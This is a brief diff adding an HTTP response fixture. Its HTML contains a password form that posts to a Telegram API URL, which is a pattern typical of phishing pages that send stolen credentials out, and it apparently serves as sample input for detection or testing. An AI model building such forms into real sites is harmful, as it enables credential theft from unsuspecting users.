@@ -1,0 +1,4 @@
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+
+<html><body><form action="https://api.telegram.org/file/x" method="post"><input type="password" name="password"></form></body></html>
